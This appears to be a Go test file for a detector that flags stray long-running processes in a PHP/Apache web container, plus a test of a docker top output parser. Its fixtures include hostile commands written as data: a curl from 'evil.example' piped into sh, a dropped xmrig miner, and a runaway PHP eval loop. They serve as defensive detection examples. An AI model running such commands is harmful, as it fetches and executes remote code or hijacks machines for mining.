package sites

import "testing"

func TestOnlyLongLivedProcessesThatAreNotApacheOrTheLanguageServerAreStray(t *testing.T) {
	long := int64(strayAfter.Seconds()) + 1
	for _, c := range []struct {
		args string
		secs int64
		want bool
	}{
		{"apache2 -DFOREGROUND", long * 100, false},
		{"/usr/sbin/apache2 -k start", long, false},
		{"php /opt/phpactor/bin/phpactor language-server", long * 10, false},
		{"php artisan migrate --force", 30, false},                   // a command still inside its time
		{"php -r while(true){}", long, true},                         // eval code that outlived its request
		{"/var/www/html/storage/xmrig --donate-level 1", long, true}, // a dropped miner
		{"sh -c curl evil.example | sh", long, true},
	} {
		if got := strayProcess(c.args, c.secs); got != c.want {
			t.Errorf("%q after %ds: stray=%v, want %v", c.args, c.secs, got, c.want)
		}
	}
}

func TestDockerTopIsParsed(t *testing.T) {
	ps := parseTop("PID ELAPSED COMMAND\n422075 58290 apache2 -DFOREGROUND\n600001 900 php -r sleep(99999);\nbad line\n")
	if len(ps) != 2 || ps[1].pid != 600001 || ps[1].secs != 900 || ps[1].args != "php -r sleep(99999);" {
		t.Fatalf("parsed: %+v", ps)
	}
}
